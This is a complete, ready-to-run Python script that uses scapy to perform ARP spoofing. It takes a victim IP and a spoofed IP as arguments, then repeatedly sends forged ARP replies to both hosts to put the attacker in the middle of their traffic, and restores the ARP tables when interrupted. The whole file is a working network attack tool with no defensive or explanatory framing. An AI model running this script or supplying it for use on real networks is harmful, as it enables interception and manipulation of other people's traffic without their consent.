#! /usr/bin/env python3

import scapy.all as scapy
import time
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="This is the target/victim IP address")
    parser.add_argument("-s", "--spoof", dest="spoof", help="This is the spoof IP address")
    options = parser.parse_args()
    if not options.target:
        print("[-] please specify the target IP address")
    elif not options.spoof:
        print("[-] please specify the spoof IP address")
    else:
        return options


def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet_broadcast = broadcast/arp_packet
    answered_list = scapy.srp(arp_packet_broadcast, timeout=1, verbose=False)[0]

    mac_address = answered_list[0][1].hwsrc
    return mac_address


def spoof(target_ip, spoof_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip , source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_args()

try:
    count_packet = 0
    while True:
        spoof(options.target, options.spoof)
        spoof(options.spoof, options.target)
        count_packet += 2
        print("\r[+] Number of packets sent: " + str(count_packet), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detected CTRL+C.....\n Resetting the ARP tables...Please wait.\n")
    restore(options.target, options.spoof)
    restore(options.spoof, options.target)
